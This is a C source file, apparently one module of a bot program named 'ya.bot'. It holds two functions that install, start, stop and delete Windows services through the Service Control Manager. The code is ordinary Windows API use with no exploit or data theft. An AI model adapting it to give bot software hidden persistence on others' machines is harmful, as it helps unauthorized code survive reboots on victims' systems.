/*  ya.bot  */

#include "bot.h"

bool service_install(char *pszServiceName,
		char *pszServicePath,
		DWORD dwServiceType,
		DWORD dwServiceStartup,
		bool bStartService)
{
	SC_HANDLE hManager, hService;

#ifndef NO_DEBUG
		debug_print("Installing service, service_install()");
#endif
		
		hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		hService = CreateService(hManager,
				pszServiceName,
				pszServiceName,
				SERVICE_ALL_ACCESS,
				dwServiceType,
				dwServiceStartup,
				SERVICE_ERROR_IGNORE,
				pszServicePath,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL);
	if (!hService)
	{
			CloseServiceHandle(hManager);
			return FALSE;
	}
	if (bStartService)
	{
			hService = OpenService(hManager, pszServiceName, SERVICE_ALL_ACCESS);
		if (hService)
				StartService(hService, 0, NULL);
	}
		CloseServiceHandle(hService);
		CloseServiceHandle(hManager);
		return TRUE;
}

bool service_uninstall(char *pszServiceName)
{
	SC_HANDLE hManager, hService;
	SERVICE_STATUS serviceStatus;

#ifndef NO_DEBUG
		debug_print("Uninstalling service, service_uninstall()");
#endif

		hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		hService = OpenService(hManager, pszServiceName, SERVICE_ALL_ACCESS);
	if (!hService)
	{
			CloseServiceHandle(hManager);
			return FALSE;
	}
		ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
		DeleteService(hService);
		CloseServiceHandle(hService);
		CloseServiceHandle(hManager);
		return TRUE;
}
